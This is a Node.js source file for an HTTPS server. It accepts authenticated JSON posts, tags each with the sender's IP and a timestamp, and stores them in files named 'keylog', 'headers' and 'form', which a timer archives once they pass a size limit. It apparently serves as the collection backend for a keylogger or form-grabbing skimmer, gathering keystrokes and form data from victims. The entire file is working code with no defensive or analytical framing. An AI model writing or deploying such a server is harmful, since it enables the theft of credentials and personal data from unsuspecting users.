const https = require('https'),
fs = require('fs'),
config = require('../config');

const options = {
  key: fs.readFileSync('./cert/key.pem'),
  cert: fs.readFileSync('./cert/cert.pem')
},
port = config.server.port,
server = https.createServer(Object.assign({},options))


server.on('request', function(req, res){
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  if(
    req.method !== 'POST' ||
    req.headers['content-type'] !== 'application/json' ||
    !req.headers['x-api'] ||
    req.headers['x-api'] !== config.server.api
  ){
    res.writeHead(401, config.server.headers);
    return res.end(JSON.stringify({success: false}))
  }

  req.setEncoding('utf8');

  let data = '';
  req.on('data', function(chunk){
    data+= chunk;
  })

  req.on('end', function(){
    try {
      data = JSON.parse(data);
      data.ip = ip;
      data.date = Date.now();

      //send to db
      if(!data.data){
        fs.appendFile('./admin/db/keylog', JSON.stringify(data)+ ',', function(err){
          if(err){console.error(err)}
        })
      } else if(data.data.data){
        fs.appendFile('./admin/db/headers', JSON.stringify(data)+ ',', function(err){
          if(err){console.error(err)}
        })
      } else {
        fs.appendFile('./admin/db/form', JSON.stringify(data)+ ',', function(err){
          if(err){console.error(err)}
        })
      }

      res.writeHead(200, config.server.headers);
      return res.end(JSON.stringify({success: true}))
    } catch (err) {
      res.writeHead(400, config.server.headers);
      return res.end(JSON.stringify({success: false}))
    }
  })

});

server.on('error', function(err){
  return console.error('error:'+ err)
});

server.listen(port, function(){
  console.log('Server listening on port:'+ port)
});

setInterval(function(){
  let arr = ['form','headers','keylog'];
  for (let i = 0; i < arr.length; i++) {
    fs.stat('./admin/db/'+ arr[i], function(err, stats){
      if(err){return console.error(err)}
      if(stats.size > config.db.max_size){
        fs.copyFile('./admin/db/'+ arr[i], './admin/store/'+ arr[i] +'-'+ Date.now(), function(err){
          if(err){return console.error(err)}
          fs.writeFile('./admin/db/'+ arr[i], '[', function(err){
            if(err){return console.error(err)}
          })
        })
      }
    })
  }
}, config.db.interval)
